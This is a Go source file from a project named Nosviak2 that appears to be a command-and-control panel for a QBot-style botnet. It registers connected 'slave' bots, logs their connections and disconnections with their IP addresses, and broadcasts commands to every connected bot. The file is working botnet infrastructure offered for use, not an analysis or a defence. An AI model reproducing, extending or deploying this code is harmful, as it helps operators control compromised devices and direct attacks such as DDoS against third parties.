package qbot

import (
	"Nosviak2/core/sources/language/static"
	"Nosviak2/core/sources/layouts/toml"
	"Nosviak2/core/sources/tools"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

//stores config for qbot
//allows us to broadcast better
type QbotClient struct { //stored in structure
	Name  string //name
	Queue chan []byte //chan
	Conn  net.Conn //connection
	Key   int64 //map key
}

var (
	QbotClients map[int64]*QbotClient = make(map[int64]*QbotClient) //stores all qbots
	SyncMutex   sync.Mutex //syncs the information properly
)


//creates the client properly
//this will ensure its done without errors
func (Q *QbotClient) AddClient() {

	SyncMutex.Lock()
	defer SyncMutex.Unlock()
	Q.Key = time.Now().UnixMicro()
	QbotClients[Q.Key] = Q



	//dynamic connection information has been set here
	//this will ensure its done without errors happening
	if toml.ConfigurationToml.Terminal.DynamicTerminal { //dynamic connection
		static.SlaveController(static.Controls["connect_slave.tfx"], tools.Sanatize(Q.Name), strings.Split(Q.Conn.RemoteAddr().String(), ":")[0], strings.Split(Q.Conn.RemoteAddr().String(), ":")[1], "qbot", 0, len(QbotClients), os.Stdout)
	} else {
		//prints the correct message properly without issues happening
		//this will ensure the terminal knows about the new slave properly
		log.Printf("[qbot] [slave connected] [%s] [%s] [%d]\r\n", Q.Conn.RemoteAddr().String(), tools.Sanatize(Q.Name), len(QbotClients))
	}
}

//creates the client properly
//this will ensure its done without errors
func (Q *QbotClient) RemoveClient() {

	SyncMutex.Lock()
	defer SyncMutex.Unlock()
	delete(QbotClients, Q.Key)

	//dynamic system properly and safely
	//this will ensure its done without errors happenign
	if toml.ConfigurationToml.Terminal.DynamicTerminal {
		static.SlaveController(static.Controls["disconnect_slave.tfx"], tools.Sanatize(Q.Name), strings.Split(Q.Conn.RemoteAddr().String(), ":")[0], strings.Split(Q.Conn.RemoteAddr().String(), ":")[1], "qbot", 0, len(QbotClients), os.Stdout)
	} else {
		//alert for slave disconnect
		//this will print into the terminal
		log.Printf("[qbot] [Slave left] [%s] [%s] [%d]", tools.Sanatize(Q.Name), strings.Split(Q.Conn.RemoteAddr().String(), ":")[0], len(QbotClients))
	}
}

//broadcasts the message to all slaves
//this will let me know of the message properly
func Broadcast(b []byte) { //broadcasts properly
	for _, slave := range QbotClients { //ranges
		slave.Queue <- b
	}
}